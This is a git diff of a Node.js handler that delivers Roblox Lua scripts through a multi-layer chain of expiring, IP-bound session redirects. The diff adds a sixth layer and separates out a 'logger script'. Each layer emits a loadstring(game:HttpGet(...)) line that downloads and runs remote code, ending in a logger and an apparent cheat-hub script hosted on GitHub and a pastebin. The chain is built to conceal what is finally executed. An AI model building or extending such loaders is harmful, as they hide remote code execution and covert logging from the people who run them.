@@ -1,11 +1,11 @@
 const https = require('https');
 
 const SETTINGS = {
-    TOTAL_LAYERS: 5,
+    TOTAL_LAYERS: 6,
     MIN_WAIT: 112, 
     MAX_WAIT: 119, 
-    SESSION_EXPIRY: 10000, 
-    KEY_LIFETIME: 5000,   
+    SESSION_EXPIRY: 15000, 
+    KEY_LIFETIME: 8000,   
     PLAIN_TEXT_URL: "https://pastefy.app/cMzbfLvJ/raw",
     REAL_SCRIPT_URL: "https://raw.githubusercontent.com/xvndr4wz/loader-api/refs/heads/main/scripts/NdraawzHubBF.lua",
     LOGGER_SCRIPT_URL: "https://raw.githubusercontent.com/xvndr4wz/loader-api/refs/heads/main/api/logger/logscript.lua"
@@ -165,35 +165,40 @@ module.exports = async function(req, res) {
         const idx = session.currentIndex;
 
         /*
-         * TOTAL_LAYERS = 5, mapping idx:
+         * TOTAL_LAYERS = 6, mapping idx:
          * idx 0 → layer 1 → redirect biasa
          * idx 1 → layer 2 → redirect biasa
          * idx 2 → layer 3 → redirect biasa
-         * idx 3 → layer 4 → isi LOGGER SCRIPT saja (tanpa loadstring)
-         * idx 4 → layer 5 → isi MAIN SCRIPT saja
+         * idx 3 → layer 4 → logger script + loadstring ke layer 5
+         * idx 4 → layer 5 → isi logger script SAJA (tanpa loadstring)
+         * idx 5 → layer 6 → isi main script SAJA
          */
 
-        // ========== LAYER 5 (idx = TOTAL_LAYERS - 1): MAIN SCRIPT SAJA ==========
+        // ========== LAYER 6 (idx = TOTAL_LAYERS - 1): MAIN SCRIPT SAJA ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 1) {
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
             delete sessions[id];
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 4 (idx = TOTAL_LAYERS - 2): LOGGER SCRIPT + REDIRECT KE LAYER 5 ==========
+        // ========== LAYER 5 (idx = TOTAL_LAYERS - 2): LOGGER SCRIPT SAJA ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 2) {
+            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
+            delete sessions[id];
+            return res.status(200).send(loggerScript || '');
+        }
+
+        // ========== LAYER 4 (idx = TOTAL_LAYERS - 3): REDIRECT KE LAYER 5 ==========
+        if (idx === SETTINGS.TOTAL_LAYERS - 3) {
             const nextIndex = idx + 1;
             const { newSessionID, nextKey, waitTime } = makeSession(
                 session.ownerIP, session.stepSequence, nextIndex, session.startTime
             );
             delete sessions[id];
 
-            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextStepNumber = session.stepSequence[nextIndex];
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-
-            // Logger script dijalankan dulu, lalu di baris terakhirnya loadstring ke layer 5
-            const luaScript = (loggerScript || '') + "\ntask.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
+            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
 
